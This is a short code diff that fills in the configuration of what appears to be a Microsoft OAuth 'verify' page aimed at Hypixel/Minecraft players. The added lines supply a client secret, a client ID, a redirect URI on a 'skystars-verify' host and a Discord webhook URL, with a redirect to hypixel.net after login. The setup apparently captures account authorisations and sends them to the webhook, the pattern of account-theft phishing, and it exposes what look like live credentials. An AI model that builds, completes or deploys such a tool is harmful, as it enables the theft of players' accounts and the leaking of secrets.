@@ -1,8 +1,8 @@
 //Change these
-const client_secret = '' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = ''
-const redirect_uri = ''
-const webhook_url = ''
+const client_secret = 'BWn8Q~WmMo4f~PMyaZTt_TPk3mYUh8IIsGziMaJW' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'e50fd351-1800-4c50-b378-02e5d0b93efb'
+const redirect_uri = 'https://skystars-verify.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1119532630468210722/v6hKsMPPqzvUBeAlM468cCX_8dNzmjVO80dyr3rcqFGgVZq0CZcAF91XqKp6T6CMPsaQ'
 const redirection = 'https://hypixel.net' //Redirects the user after they login and allow (e.g 'https://hypixel.net') LEAVE BLANK IF U DONT WANT IT TO REDIRECT OR SUM IDK
 const microsoft = false //IF TRUE, WILL REDIRECT TO MICROSOFT DRECTLY INSTEAD OF THE PAGE WITH THE BUTTON
 
